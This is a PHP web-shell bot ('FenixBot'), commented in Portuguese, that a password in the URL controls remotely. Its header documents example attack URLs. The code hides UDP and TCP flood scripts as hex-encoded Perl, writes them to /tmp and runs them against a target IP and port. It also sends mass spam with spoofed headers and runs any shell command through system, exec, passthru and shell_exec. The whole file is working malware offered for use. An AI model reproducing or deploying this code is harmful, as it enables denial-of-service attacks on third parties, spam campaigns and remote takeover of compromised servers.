﻿<?php
  
  /*
  ** PHP Bot coded for Constantine (FenixBot). - 20/06/2015.
  ** Setar senha do bot na define 'LOGIN_HASH' em md5.
  **
  ** Functions...
  **  DDos, Spam (Perl e PHP), Run command, Kill Perl running.
  **
  ** Functions details...
  **  DDoS:
  **    command = ddos.
  **    flag = Attack method: udp, tcp.
  **    data = IP:PORT.
  **    
  **    phpBot.php?hash=admin&command=ddos&flag=udp&data=111.111.111.111:22
  **    
  **  Spam:
  **    command = spam, phpspam (spam via mail() function).
  **    flag = 1 é padrão para spam normal. 
  **           Para phpspam, 1 = Usa função system() para rodar enviador, 
  **           2 = Utiliza todas as funções (Envia repetido).
  **    data = null (default).
  **    
  **    POST data:
  **     maillist=...&subject=...&from=...&message=...
  **      
  **    phpBot.php?hash=admin&command=spam&flag=1&data=null
  **    
  **  Run file:
  **    command = run.
  **    flag = 1 (default).
  **    data = Command to run
  **  
  **    phpBot.php?hash=admin&command=run&flag=1&data=dir.exe
  **    
  **  Kill dependencies:  
  **    command = kill.
  **    flag = 1 (default).
  **    data = null (default)
  **  
  **    phpBot.php?hash=admin&command=kill&flag=1&data=null
  ** 
  */
  
  error_reporting(0);
  
  /*
  ** Configurações do bot.
  */
  define('LOGIN_HASH', '21232f297a57a5a743894a0e4a801fc3');
  
  class Bot {
    private $command = null;
    private $status = false;
    private $flag = null;
    private $data = null;
    private $hash = null;
    
    /*
    ** Faz tratamento dos parâmetros recebidos via GET e POST.
    */
    public function __construct () {
      if (isset($_GET['hash']) && isset($_GET['command']) && 
          isset($_GET['flag']) && isset($_GET['data']) &&
          $this->check($_GET['hash']) && $this->check($_GET['command']) && 
          $this->check($_GET['flag']) && $this->check($_GET['data'])) 
      {
        $this -> command = $_GET['command'];
        $this -> hash = $_GET['hash'];
        $this -> flag = $_GET['flag'];
        $this -> data = $_GET['data'];
        
        if (LOGIN_HASH == md5($_GET['hash']))
          $this -> status = true;
      }
    }
    
    /*
    ** Nucleo da aplicação
    */
    public function core () {
      if ($this -> status == true) {
        if ($this -> command == 'ddos') {
          $this -> ddos();
        } else if ($this -> command == 'spam') {
          $this -> perlSpam();
        } else if ($this -> command == 'phpspam') {
          $this -> phpSpam();
        } else if ($this -> command == 'run') {
          $this -> run();
        } else if ($this -> command == 'kill') {
          $this -> killBots();
        }
      }
    }
    
    /*
    ** Responsável pelo controle do DDoS.
    */ 
    private function ddos () {
      $host = explode(':', $this -> data);      
      if ($this -> flag == 'udp') { 
        $this -> perlUdpFlooder($host[0], $host[1]);
      } else if ($this -> flag == 'tcp') { 
        $this -> perlTcpFlooder($host[0], $host[1]);
      }
    }
    
    /*
    ** UDP Flooder, responsável por rodar pacotador Perl na máquina.
    **  @host = Alvo a ser atacado.
    **  @port = Porta do alvo a ser atacado.
    */
    private function perlUdpFlooder ($host, $port) {
      // Perl script in hex.
      $perlCode = 
        "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0d\x0a\x20\x20\x20".
        "\x20\x20\x20\x20\x20\x20\x75\x73\x65\x20\x53\x6f\x63\x6b\x65\x74\x3b\x0d\x0a\x20".
        "\x20\x20\x20\x20\x20\x20\x20\x20\x6d\x79\x20\x28\x5c\x24\x69\x70\x2c\x20\x5c\x24".
        "\x70\x6f\x72\x74\x2c\x20\x5c\x24\x73\x69\x7a\x65\x2c\x20\x5c\x24\x74\x69\x6d\x65".
        "\x29\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x5c\x24\x69\x70\x3d\x20\x5c".
        "\x24\x41\x52\x47\x56\x5b\x30\x5d\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20".
        "\x5c\x24\x70\x6f\x72\x74\x3d\x20\x5c\x24\x41\x52\x47\x56\x5b\x31\x5d\x3b\x20\x0d".
        "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x5c\x24\x74\x69\x6d\x65\x3d\x20\x5c\x24".
        "\x41\x52\x47\x56\x5b\x32\x5d\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73".
        "\x6f\x63\x6b\x65\x74\x28\x63\x72\x61\x7a\x79\x2c\x20\x50\x46\x5f\x49\x4e\x45\x54".
        "\x2c\x20\x53\x4f\x43\x4b\x5f\x44\x47\x52\x41\x4d\x2c\x20\x31\x37\x29\x3b\x0d\x0a".
        "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x5c\x24\x69\x61\x64\x64\x72\x20\x3d\x20\x69".
        "\x6e\x65\x74\x5f\x61\x74\x6f\x6e\x28\x5c\x22\x5c\x24\x69\x70\x5c\x22\x29\x3b\x0d".
        "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x69\x66\x20\x28\x5c\x24\x41\x52\x47\x56".
        "\x5b\x31\x5d\x20\x3d\x3d\x30\x20\x26\x26\x20\x5c\x24\x41\x52\x47\x56\x5b\x32\x5d".
        "\x20\x3d\x3d\x30\x29\x20\x7b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x67".
        "\x6f\x74\x6f\x20\x72\x61\x6e\x64\x70\x61\x63\x6b\x65\x74\x73\x3b\x0d\x0a\x20\x20".
        "\x20\x20\x20\x20\x20\x20\x20\x7d\x20\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20".
        "\x69\x66\x20\x28\x5c\x24\x41\x52\x47\x56\x5b\x31\x5d\x20\x21\x3d\x30\x20\x26\x26".
        "\x20\x5c\x24\x41\x52\x47\x56\x5b\x32\x5d\x20\x21\x3d\x30\x29\x20\x7b\x0d\x0a\x20".
        "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73\x79\x73\x74\x65\x6d\x28\x5c\x22\x28\x73".
        "\x6c\x65\x65\x70\x20\x5c\x24\x74\x69\x6d\x65\x3b\x6b\x69\x6c\x6c\x61\x6c\x6c\x20".
        "\x2d\x39\x20\x75\x64\x70\x29\x20\x26\x5c\x22\x29\x3b\x0d\x0a\x20\x20\x20\x20\x20".
        "\x20\x20\x20\x20\x20\x67\x6f\x74\x6f\x20\x70\x61\x63\x6b\x65\x74\x73\x3b\x0d\x0a".
        "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20".
        "\x20\x69\x66\x20\x28\x5c\x24\x41\x52\x47\x56\x5b\x31\x5d\x20\x21\x3d\x30\x20\x26".
        "\x26\x20\x5c\x24\x41\x52\x47\x56\x5b\x32\x5d\x20\x3d\x3d\x30\x29\x20\x7b\x0d\x0a".
        "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x67\x6f\x74\x6f\x20\x70\x61\x63\x6b\x65".
        "\x74\x73\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x0d\x0a\x20\x20\x20".
        "\x20\x20\x20\x20\x20\x20\x69\x66\x20\x28\x5c\x24\x41\x52\x47\x56\x5b\x31\x5d\x20".
        "\x3d\x3d\x30\x20\x26\x26\x20\x5c\x24\x41\x52\x47\x56\x5b\x32\x5d\x20\x21\x3d\x30".
        "\x29\x20\x7b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73\x79\x73\x74\x65".
        "\x6d\x28\x5c\x22\x28\x73\x6c\x65\x65\x70\x20\x5c\x24\x74\x69\x6d\x65\x3b\x6b\x69".
        "\x6c\x6c\x61\x6c\x6c\x20\x2d\x39\x20\x75\x64\x70\x29\x20\x26\x5c\x22\x29\x3b\x20".
        "\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x67\x6f\x74\x6f\x20\x72\x61\x6e".
        "\x64\x70\x61\x63\x6b\x65\x74\x73\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20".
        "\x7d\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x70\x61\x63\x6b\x65\x74\x73\x3a".
        "\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x66\x6f\x72\x20\x28\x3b\x3b\x29\x20".
        "\x7b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x5c\x24\x73\x69\x7a\x65\x3d".
        "\x5c\x24\x72\x61\x6e\x64\x20\x78\x20\x5c\x24\x72\x61\x6e\x64\x20\x78\x20\x5c\x24".
        "\x72\x61\x6e\x64\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6e".
        "\x64\x28\x63\x72\x61\x7a\x79\x2c\x20\x30\x2c\x20\x5c\x24\x73\x69\x7a\x65\x2c\x20".
        "\x73\x6f\x63\x6b\x61\x64\x64\x72\x5f\x69\x6e\x28\x5c\x24\x70\x6f\x72\x74\x2c\x20".
        "\x5c\x24\x69\x61\x64\x64\x72\x29\x29\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20".
        "\x20\x7d\x20\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x72\x61\x6e\x64\x70\x61".
        "\x63\x6b\x65\x74\x73\x3a\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x66\x6f\x72".
        "\x20\x28\x3b\x3b\x29\x20\x7b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x5c".
        "\x24\x73\x69\x7a\x65\x3d\x5c\x24\x72\x61\x6e\x64\x20\x78\x20\x5c\x24\x72\x61\x6e".
        "\x64\x20\x78\x20\x5c\x24\x72\x61\x6e\x64\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20".
        "\x20\x20\x20\x5c\x24\x70\x6f\x72\x74\x3d\x69\x6e\x74\x28\x72\x61\x6e\x64\x20\x36".
        "\x35\x30\x30\x30\x29\x20\x2b\x31\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20".
        "\x20\x73\x65\x6e\x64\x28\x63\x72\x61\x7a\x79\x2c\x20\x30\x2c\x20\x5c\x24\x73\x69".
        "\x7a\x65\x2c\x20\x73\x6f\x63\x6b\x61\x64\x64\x72\x5f\x69\x6e\x28\x5c\x24\x70\x6f".
        "\x72\x74\x2c\x20\x5c\x24\x69\x61\x64\x64\x72\x29\x29\x3b\x0d\x0a\x20\x20\x20\x20".
        "\x20\x20\x20\x20\x20\x7d";
      
      $path = "/tmp/A9342.txt";
      if (($fp = fopen($path, "w")) != null) {
        fwrite($fp, $perlCode);
        fclose($fp);
        $this -> multipleRun("perl {$path} {$host} {$port} 999999 &");
      }
    }
    
    /*
    ** TCP Flooder, responsável por rodar pacotador Perl na máquina.
    **  @host = Alvo a ser atacado.
    **  @port = Porta do alvo a ser atacado.
    */
    private function perlTcpFlooder ($host, $port) {
      // Perl script in hex.
      $perlCode = 
        "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0d\x0a\x20\x20\x20".
        "\x20\x20\x20\x20\x20\x75\x73\x65\x20\x73\x74\x72\x69\x63\x74\x3b\x0d\x0a\x20\x20".
        "\x20\x20\x20\x20\x20\x20\x75\x73\x65\x20\x53\x6f\x63\x6b\x65\x74\x3b\x0d\x0a\x20".
        "\x20\x20\x20\x20\x20\x20\x20\x6d\x79\x20\x5c\x24\x68\x6f\x73\x74\x20\x3d\x20\x5c".
        "\x24\x41\x52\x47\x56\x5b\x30\x5d\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x6d".
        "\x79\x20\x5c\x24\x70\x6f\x72\x74\x20\x3d\x20\x5c\x24\x41\x52\x47\x56\x5b\x31\x5d".
        "\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x6d\x79\x20\x5c\x24\x66\x6f\x72\x6b".
        "\x73\x20\x3d\x20\x31\x30\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x6d\x79\x20".
        "\x5c\x24\x73\x69\x7a\x65\x20\x3d\x20\x36\x35\x35\x30\x37\x3b\x0d\x0a\x20\x20\x20".
        "\x20\x20\x20\x20\x20\x6d\x79\x20\x5c\x24\x69\x70\x61\x64\x64\x72\x20\x3d\x20\x69".
        "\x6e\x65\x74\x5f\x61\x74\x6f\x6e\x28\x5c\x24\x68\x6f\x73\x74\x29\x3b\x0d\x0a\x20".
        "\x20\x20\x20\x20\x20\x20\x20\x6d\x79\x20\x5c\x24\x70\x61\x64\x64\x72\x20\x3d\x20".
        "\x73\x6f\x63\x6b\x61\x64\x64\x72\x5f\x69\x6e\x28\x5c\x24\x70\x6f\x72\x74\x2c\x20".
        "\x5c\x24\x69\x70\x61\x64\x64\x72\x29\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20".
        "\x6d\x79\x20\x5c\x24\x6d\x73\x67\x20\x3d\x20\x5c\x22\x41\x5c\x22\x20\x78\x20\x5c".
        "\x24\x73\x69\x7a\x65\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x6d\x79\x20\x40".
        "\x63\x68\x69\x6c\x64\x73\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x6f\x63".
        "\x6b\x65\x74\x28\x6d\x79\x20\x5c\x24\x53\x4f\x43\x4b\x2c\x20\x50\x46\x5f\x49\x4e".
        "\x45\x54\x2c\x20\x53\x4f\x43\x4b\x5f\x53\x54\x52\x45\x41\x4d\x2c\x20\x67\x65\x74".
        "\x70\x72\x6f\x74\x6f\x62\x79\x6e\x61\x6d\x65\x28\x5c\x22\x74\x63\x70\x5c\x22\x29".
        "\x29\x20\x6f\x72\x20\x64\x69\x65\x20\x5c\x22\x65\x72\x72\x6f\x20\x6e\x6f\x20\x73".
        "\x6f\x63\x6b\x65\x74\x3a\x20\x5c\x24\x21\x5c\x22\x3b\x0d\x0a\x20\x20\x20\x20\x20".
        "\x20\x20\x20\x64\x69\x65\x20\x20\x5c\x22\x70\x6f\x72\x74\x61\x20\x66\x65\x63\x68".
        "\x61\x64\x61\x5c\x6e\x5c\x22\x20\x75\x6e\x6c\x65\x73\x73\x20\x63\x6f\x6e\x6e\x65".
        "\x63\x74\x28\x5c\x24\x53\x4f\x43\x4b\x2c\x20\x5c\x24\x70\x61\x64\x64\x72\x29\x3b".
        "\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x63\x6c\x6f\x73\x65\x20\x5c\x24\x53\x4f".
        "\x43\x4b\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x66\x6f\x72\x20\x28\x6d\x79".
        "\x20\x5c\x24\x69\x20\x3d\x20\x30\x3b\x20\x5c\x24\x69\x20\x3c\x20\x5c\x24\x66\x6f".
        "\x72\x6b\x73\x3b\x20\x5c\x24\x69\x2b\x2b\x29\x20\x7b\x0d\x0a\x20\x20\x20\x20\x20".
        "\x20\x20\x20\x20\x20\x6d\x79\x20\x5c\x24\x70\x69\x64\x20\x3d\x20\x66\x6f\x72\x6b".
        "\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x75\x6e\x6c\x65\x73\x73\x20".
        "\x28\x5c\x24\x70\x69\x64\x29\x20\x7b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20".
        "\x20\x20\x20\x77\x68\x69\x6c\x65\x20\x28\x31\x29\x20\x7b\x0d\x0a\x20\x20\x20\x20".
        "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73\x6f\x63\x6b\x65\x74\x28\x5c\x24\x53".
        "\x4f\x43\x4b\x2c\x20\x50\x46\x5f\x49\x4e\x45\x54\x2c\x20\x53\x4f\x43\x4b\x5f\x53".
        "\x54\x52\x45\x41\x4d\x2c\x20\x67\x65\x74\x70\x72\x6f\x74\x6f\x62\x79\x6e\x61\x6d".
        "\x65\x28\x5c\x22\x74\x63\x70\x5c\x22\x29\x29\x20\x6f\x72\x20\x64\x69\x65\x20\x5c".
        "\x22\x65\x72\x72\x6f\x20\x6e\x6f\x20\x73\x6f\x63\x6b\x65\x74\x3a\x20\x5c\x24\x21".
        "\x5c\x22\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x69".
        "\x66\x20\x28\x63\x6f\x6e\x6e\x65\x63\x74\x28\x5c\x24\x53\x4f\x43\x4b\x2c\x20\x5c".
        "\x24\x70\x61\x64\x64\x72\x29\x29\x20\x20\x7b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20".
        "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6e\x64\x28\x5c\x24\x53\x4f\x43\x4b".
        "\x2c\x20\x5c\x24\x6d\x73\x67\x2c\x20\x30\x2c\x20\x5c\x24\x70\x61\x64\x64\x72\x29".
        "\x20\x3d\x3d\x20\x6c\x65\x6e\x67\x74\x68\x28\x5c\x24\x6d\x73\x67\x29\x20\x6f\x72".
        "\x20\x64\x69\x65\x20\x5c\x22\x65\x72\x72\x6f\x20\x61\x6f\x20\x65\x6e\x76\x69\x61".
        "\x72\x20\x5c\x24\x68\x6f\x73\x74\x3a\x5c\x24\x70\x6f\x72\x74\x5c\x6e\x20\x24\x21".
        "\x5c\x22\x20\x3b\x20\x20\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20".
        "\x20\x20\x20\x20\x20\x7d\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20".
        "\x20\x20\x63\x6c\x6f\x73\x65\x20\x5c\x24\x53\x4f\x43\x4b\x3b\x0d\x0a\x20\x20\x20".
        "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x20\x0d\x0a\x20\x20\x20\x20\x20\x20\x20".
        "\x20\x20\x20\x7d\x65\x6c\x73\x65\x20\x7b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20".
        "\x20\x20\x20\x20\x70\x75\x73\x68\x28\x40\x63\x68\x69\x6c\x64\x73\x2c\x20\x5c\x24".
        "\x70\x69\x64\x29\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x0d\x0a".
        "\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x66".
        "\x6f\x72\x65\x61\x63\x68\x20\x28\x40\x63\x68\x69\x6c\x64\x73\x29\x20\x7b\x0d\x0a".
        "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x77\x61\x69\x74\x70\x69\x64\x28\x5c\x24".
        "\x5f\x2c\x20\x30\x29\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x7d";
      
      $path = "/tmp/B9342.txt";
      if (($fp = fopen($path, "w")) != null) {
        fwrite($fp, $perlCode);
        fclose($fp);
        $this -> multipleRun("perl {$path} {$host} {$port} &");
      }
    }
    
    /*
    ** Responsável por killar bots que estão em execução na máquina.
    */
    private function killBots () {
      $this -> multipleRun('killall -9 perl'); // Kila flooders.
    }
    
    /*
    ** Responsável pelo controle do Spam via Perl.
    */ 
    private function perlSpam () {
      if (isset($_POST['maillist']) && isset($_POST['subject']) && 
          isset($_POST['from']) && isset($_POST['message']))
        if ($this -> check($_POST['maillist']) && $this -> check($_POST['subject']) && 
            $this -> check($_POST['from']) && $this -> check($_POST['message']))
        {
          $subject = trim($_POST['subject']);
          $from = trim($_POST['from']);
          
          $maillist = "/tmp/C3323.txt";
          if (($fp = fopen($maillist, "w")) != null) {
            fwrite($fp, $_POST['maillist']);
            fclose($fp);
          }
          
          $message = "/tmp/C3263.html";
          if (($fp = fopen($message, "w")) != null) {
            fwrite($fp, $_POST['message']);
            fclose($fp);
          }
          
          // Perl script in hex.
          $perlCode = 
            "\x23\x21\x2f\x75\x73\x72\x2f\x6c\x6f\x63\x61\x6c\x2f\x62\x69\x6e\x2f\x70\x65".
            "\x72\x6c\x0d\x0a\x24\x6d\x61\x69\x6c\x74\x79\x70\x65\x20\x2e\x3d\x20\x22\x4d".
            "\x49\x4d\x45\x2d\x56\x65\x72\x73\x69\x6f\x6e\x3a\x20\x31\x2e\x30\x5c\x6e\x22".
            "\x3b\x0d\x0a\x24\x6d\x61\x69\x6c\x74\x79\x70\x65\x20\x2e\x3d\x20\x22\x43\x6f".
            "\x6e\x74\x65\x6e\x74\x2d\x74\x79\x70\x65\x3a\x20\x74\x65\x78\x74\x2f\x68\x74".
            "\x6d\x6c\x3b\x20\x63\x68\x61\x72\x73\x65\x74\x3d\x69\x73\x6f\x2d\x38\x38\x35".
            "\x39\x2d\x31\x5c\x6e\x22\x3b\x0d\x0a\x24\x6d\x61\x69\x6c\x74\x79\x70\x65\x20".
            "\x2e\x3d\x20\x22\x58\x2d\x4d\x61\x69\x6c\x65\x72\x3a\x20\x4d\x69\x63\x72\x6f".
            "\x73\x6f\x66\x74\x20\x4f\x66\x66\x69\x63\x65\x20\x4f\x75\x74\x6c\x6f\x6f\x6b".
            "\x2c\x20\x42\x75\x69\x6c\x64\x20\x31\x31\x2e\x30\x2e\x35\x35\x31\x30\x5c\x6e".
            "\x22\x3b\x0d\x0a\x24\x6d\x61\x69\x6c\x74\x79\x70\x65\x20\x2e\x3d\x20\x22\x58".
            "\x2d\x4d\x69\x6d\x65\x4f\x4c\x45\x3a\x20\x50\x72\x6f\x64\x75\x63\x65\x64\x20".
            "\x42\x79\x20\x4d\x69\x63\x72\x6f\x73\x6f\x66\x74\x20\x4d\x69\x6d\x65\x4f\x4c".
            "\x45\x20\x56\x36\x2e\x30\x30\x2e\x33\x37\x39\x30\x2e\x31\x38\x33\x30\x22\x3b".
            "\x0d\x0a\x24\x73\x65\x6e\x64\x6d\x61\x69\x6c\x20\x3d\x20\x27\x2f\x75\x73\x72".
            "\x2f\x73\x62\x69\x6e\x2f\x73\x65\x6e\x64\x6d\x61\x69\x6c\x27\x3b\x0d\x0a\x24".
            "\x73\x65\x6e\x64\x65\x72\x20\x3d\x20\x24\x41\x52\x47\x56\x5b\x31\x5d\x3b\x0d".
            "\x0a\x24\x73\x75\x62\x6a\x65\x63\x74\x20\x3d\x20\x24\x41\x52\x47\x56\x5b\x32".
            "\x5d\x3b\x0d\x0a\x24\x65\x66\x69\x6c\x65\x20\x3d\x20\x24\x41\x52\x47\x56\x5b".
            "\x30\x5d\x3b\x0d\x0a\x24\x65\x6d\x61\x72\x20\x3d\x20\x24\x41\x52\x47\x56\x5b".
            "\x30\x5d\x3b\x0d\x0a\x6f\x70\x65\x6e\x28\x46\x4f\x4f\x2c\x20\x24\x41\x52\x47".
            "\x56\x5b\x33\x5d\x29\x3b\x0d\x0a\x40\x66\x6f\x6f\x20\x3d\x20\x3c\x46\x4f\x4f".
            "\x3e\x3b\x0d\x0a\x24\x63\x6f\x72\x70\x6f\x20\x3d\x20\x6a\x6f\x69\x6e\x28\x22".
            "\x5c\x6e\x22\x2c\x20\x40\x66\x6f\x6f\x29\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x28".
            "\x42\x41\x4e\x44\x46\x49\x54\x2c\x20\x22\x24\x65\x6d\x61\x72\x22\x29\x20\x7c".
            "\x7c\x20\x64\x69\x65\x20\x22\x43\x61\x6e\x27\x74\x20\x4f\x70\x65\x6e\x20\x24".
            "\x65\x6d\x61\x72\x22\x3b\x0d\x0a\x24\x63\x6f\x6e\x74\x3d\x30\x3b\x0d\x0a\x77".
            "\x68\x69\x6c\x65\x28\x3c\x42\x41\x4e\x44\x46\x49\x54\x3e\x29\x7b\x0d\x0a\x28".
            "\x24\x49\x44\x2c\x24\x6f\x70\x74\x69\x6f\x6e\x73\x29\x20\x3d\x20\x73\x70\x6c".
            "\x69\x74\x28\x2f\x5c\x7c\x2f\x2c\x24\x5f\x29\x3b\x0d\x0a\x63\x68\x6f\x70\x28".
            "\x24\x6f\x70\x74\x69\x6f\x6e\x73\x29\x3b\x0d\x0a\x66\x6f\x72\x65\x61\x63\x68".
            "\x20\x28\x24\x49\x44\x29\x20\x7b\x0d\x0a\x24\x72\x65\x63\x69\x70\x69\x65\x6e".
            "\x74\x20\x3d\x20\x24\x49\x44\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x28\x53\x45\x4e".
            "\x44\x4d\x41\x49\x4c\x2c\x20\x22\x7c\x20\x24\x73\x65\x6e\x64\x6d\x61\x69\x6c".
            "\x20\x2d\x74\x22\x29\x3b\x0d\x0a\x70\x72\x69\x6e\x74\x20\x53\x45\x4e\x44\x4d".
            "\x41\x49\x4c\x20\x22\x24\x6d\x61\x69\x6c\x74\x79\x70\x65\x5c\x6e\x22\x3b\x0d".
            "\x0a\x70\x72\x69\x6e\x74\x20\x53\x45\x4e\x44\x4d\x41\x49\x4c\x20\x22\x53\x75".
            "\x62\x6a\x65\x63\x74\x3a\x20\x24\x73\x75\x62\x6a\x65\x63\x74\x5c\x6e\x22\x3b".
            "\x0d\x0a\x70\x72\x69\x6e\x74\x20\x53\x45\x4e\x44\x4d\x41\x49\x4c\x20\x22\x46".
            "\x72\x6f\x6d\x3a\x20\x24\x73\x65\x6e\x64\x65\x72\x5c\x6e\x22\x3b\x0d\x0a\x70".
            "\x72\x69\x6e\x74\x20\x53\x45\x4e\x44\x4d\x41\x49\x4c\x20\x22\x54\x6f\x3a\x20".
            "\x24\x72\x65\x63\x69\x70\x69\x65\x6e\x74\x5c\x6e\x22\x3b\x0d\x0a\x70\x72\x69".
            "\x6e\x74\x20\x53\x45\x4e\x44\x4d\x41\x49\x4c\x20\x22\x24\x63\x6f\x72\x70\x6f".
            "\x5c\x6e\x5c\x6e\x22\x3b\x0d\x0a\x63\x6c\x6f\x73\x65\x20\x28\x53\x45\x4e\x44".
            "\x4d\x41\x49\x4c\x29\x3b\x0d\x0a\x24\x63\x6f\x6e\x74\x3d\x24\x63\x6f\x6e\x74".
            "\x2b\x31\x3b\x0d\x0a\x70\x72\x69\x6e\x74\x66\x20\x22\x24\x63\x6f\x6e\x74\x20".
            "\x2a\x20\x45\x6e\x76\x69\x61\x64\x6f\x20\x70\x61\x72\x61\x20\x3e\x20\x24\x72".
            "\x65\x63\x69\x70\x69\x65\x6e\x74\x22\x3b\x0d\x0a\x7d\x7d\x20\x63\x6c\x6f\x73".
            "\x65\x28\x42\x41\x4e\x44\x46\x49\x54\x29\x3b\x0d\x0a";
          
          $path = "/tmp/C3572.txt";
          if (($fp = fopen($path, "w")) != null) {
            fwrite($fp, $perlCode);
            fclose($fp);
            
            if ($this -> flag == 1)
              system("perl {$path} {$maillist} \"{$from}\" \"{$subject}\" {$message} &");
            else 
              $this -> multipleRun("perl {$path} {$maillist} \"{$from}\" \"{$subject}\" {$message} &");
          }
        }
    }
    
    /*
    ** Responsável pelo controle do Spam via PHP.
    */ 
    private function phpSpam () {
      if (isset($_POST['maillist']) && isset($_POST['subject']) && 
          isset($_POST['from']) && isset($_POST['message']))
        if ($this -> check($_POST['maillist']) && $this -> check($_POST['subject']) && 
            $this -> check($_POST['from']) && $this -> check($_POST['message']))
        {
          $subject = trim($_POST['subject']);
          $from = trim($_POST['from']);
          $maillist = trim($_POST['maillist']);
          $message = trim($_POST['message']);
          
          $list = explode("\n", $maillist);
          for ($a=0; $list[$a]!=null; $a++) {
            if (strstr($list[$a], "@")) {              
              $eol = "\r\n";
              $headers  = 'From: Carlos <'. $from .'>'.$eol; 
              $headers .= 'Reply-To: Carlos <'. $from .'>'.$eol; 
              $headers .= 'Return-Path: Carlos <'. $from .'>'.$eol;
              $headers .= "Message-ID: <".$now." thesystem@".$_SERVER['SERVER_NAME'].">".$eol; 
              $headers .= "X-Mailer: PHP v".phpversion().$eol;
              $headers .= 'MIME-Version: 1.0'.$eol;               
              mail($list[$a], $subject, $message, $headers);
            }
          }
        }
    }
    
    /*
    ** Responsável pelo controle de execução de comandos na máquina.
    */ 
    private function run () {
      $this -> multipleRun($this -> data);
    }
    
    /*
    ** Tenta executar comando utilizando multiplos métodos.
    */
    private function multipleRun ($command) {
      system($command);
      exec($command);
      passthru($command);
      shell_exec($command);
    }
    
    /*
    ** Responsável por verificar se variável está com dados 'ok'.
    */
    private function check ($variable) {
      if (isset($variable) && !empty($variable) && strlen($variable) > 0)
        return true;
      return false;
    }
  }
  
  $bot = new Bot();
  $bot -> core();
  
?>